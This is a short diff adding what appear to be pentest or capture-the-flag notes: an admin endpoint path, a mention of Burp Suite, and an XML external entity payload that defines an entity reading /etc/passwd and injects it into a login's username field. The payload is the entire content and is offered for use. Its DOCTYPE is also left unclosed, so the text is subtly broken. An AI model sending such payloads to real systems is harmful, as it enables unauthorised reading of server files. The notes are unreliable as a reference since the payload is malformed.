@@ -1,0 +1,13 @@
+/admin/process.php
+Burpsuite
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"><root>
+<username>
+&xxe;
+</username>
+<password>
+smd
+</password>
+</root>
